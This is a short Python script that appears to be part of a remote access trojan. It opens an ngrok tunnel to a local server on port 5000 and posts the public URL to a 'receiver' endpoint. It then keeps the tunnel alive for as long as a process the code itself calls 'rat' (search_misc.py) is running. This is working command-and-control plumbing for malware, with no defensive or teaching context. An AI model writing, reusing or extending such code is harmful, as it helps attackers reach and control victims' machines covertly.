import pyngrok, requests, time, psutil
from pyngrok import ngrok

def is_running():
    rat = "search_misc.py"
    for proc in psutil.process_iter(["pid", "name", "cmdline"]):
        try:
            if proc.info["cmdline"] and rat in proc.info["cmdline"]:
                return True
        except (
            psutil.NoSuchProcess,
            psutil.AccessDenied,
            psutil.ZombieProcess,
        ):
            pass
    return False

def main():
    http_tunnel = ngrok.connect(addr="localhost:5000", proto="http")
    try:
        response = requests.post(
            "http://localhost:8080/receiver",
            json={"ngrok_url": http_tunnel.public_url},
        )
 
        while True:
            time.sleep(1)
            if not is_running():
                break

    except KeyboardInterrupt:
        exit(0)

    except requests.RequestException as e:
        exit(0)

    finally:
        ngrok.disconnect(http_tunnel.public_url)
        exit(0)

if __name__ == "__main__":
    main()
